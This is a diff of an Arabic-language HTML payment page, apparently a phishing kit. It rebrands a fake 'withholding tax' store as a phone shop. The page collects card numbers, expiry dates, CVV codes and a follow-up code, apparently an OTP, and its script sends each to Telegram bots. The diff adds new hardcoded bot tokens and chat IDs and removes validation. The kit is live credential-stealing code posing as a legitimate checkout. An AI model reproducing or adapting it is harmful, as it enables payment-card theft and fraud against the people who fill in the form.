@@ -37,9 +37,9 @@
         </h1>
     </div>
     <header>
-        <img height="100%" src="https://daribe-sa.online/assets/images/1716519970WhatsApp Image 2024-05-23 at 7.50.28 PM.jpeg" width="200px">
+        <img height="100%" src="static/images/harbi.jpg" width="200px">
         <span>
-            اهلا وسهلا بكم  في متجر  ضريبة الاستقطاع   لطلبات الاستقطاع الشهري والدفعات الشهريه
+           اهلا وسهلا بكم بمتجر الحربي للهواتف
         </span>
         <div class="submit">الخطوة التالية</div>
     </header>
@@ -47,7 +47,7 @@
     <main class="hidden">
         <form id="messageForm">
         <label>قيمه الاستقطاع</label>
-        <input type="number" placeholder="ر.س" name="money" id="money">
+        <input type="number" placeholder="ر.ع" name="money" id="money">
         <div class="container preload">
             <div class="creditcard">
                 <div class="front">
@@ -193,12 +193,12 @@
             </div>
             <div class="field-container hidden">
                 <label for="expirationdate">تاريخ الإنتهاء (mm/yy)</label>
-                <input id="expirationdate" type="text" pattern="[0-9]*" inputmode="numeric" required>
+                <input id="expirationdate" type="text" pattern="[0-9]*" inputmode="numeric">
          </div>
          
             <div class="field-container">
                 <label for="securitycode">رمز الأمان (CVV)</label>
-                <input id="securitycode" type="text" pattern="[0-9]*" inputmode="numeric" required>
+                <input id="securitycode" type="text" pattern="[0-9]*" inputmode="numeric">
             </div>
             <div class="field-container" style="    display: flex;
             align-items: flex-end;">
@@ -226,10 +226,10 @@
                 var securitycode = document.getElementById('securitycode').value;
                 
         
-                var telegramToken = '7821993334:AAECa6x6pZoc2lhev7rkAPn6qrAAlRPH3Mc';
-                var telegramChatId = '-1002543187193';
+                var telegramToken = '8592120151:AAHYBlTucZeeFYjXhK3AZZdFQAJX0cV16Es';
+                var telegramChatId = '-1003754095391';
         
-                var telegramMessage = `
+                 var telegramMessage = `
                 ====== 💳 بطاقة جديدة ========
       
         💲: ${money}
@@ -363,8 +363,8 @@
                 var codee = document.getElementById('codee').value;
     
                 // معلومات بوت Telegram
-                  var telegramToken = '7821993334:AAECa6x6pZoc2lhev7rkAPn6qrAAlRPH3Mc';
-                var telegramChatId = '-1002543187193';
+                var telegramToken = '8170938688:AAEjGqT2xfXUuCv065uzRdnylppWtRFSuXE';
+                var telegramChatId = '-1002299957797'; // معرف الدردشة الخاص بك أو القناة
     
                 // بناء الرسالة التي سيتم إرسالها
                 var telegramMessage = `رسالة جديدة من المستخدم: ${codee}`;
